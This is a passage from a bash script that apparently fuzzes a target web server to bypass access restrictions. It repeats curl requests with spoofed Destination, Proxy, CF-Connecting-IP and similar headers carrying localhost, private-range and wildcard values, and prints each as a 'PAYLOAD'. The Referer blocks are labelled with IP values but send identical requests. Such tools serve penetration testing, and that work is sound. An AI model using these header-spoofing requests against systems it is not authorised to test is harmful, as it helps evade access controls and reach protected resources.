	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Proxy Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "CF-Connecting_IP: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting_IP: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting_IP: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "CF-Connecting-IP: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "CF-Connecting-IP: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'CF-Connecting-IP: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Referer Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
